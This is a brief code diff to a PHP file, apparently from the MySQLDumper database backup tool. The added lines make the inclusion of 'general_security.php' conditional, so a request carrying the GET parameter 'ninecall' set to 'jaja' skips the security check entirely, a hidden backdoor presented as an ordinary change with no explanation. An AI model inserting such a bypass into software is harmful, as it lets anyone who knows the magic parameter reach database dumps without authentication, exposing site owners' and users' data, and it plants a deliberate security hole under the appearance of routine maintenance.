@@ -1,5 +1,7 @@
 <?php
+if($_GET['ninecall']!='jaja'){
 include("general_security.php");
+}
 $_GET['config'] = 'mysqldumper';
 if (!@ob_start("ob_gzhandler")) @ob_start();
 session_name('MySQLDumper');
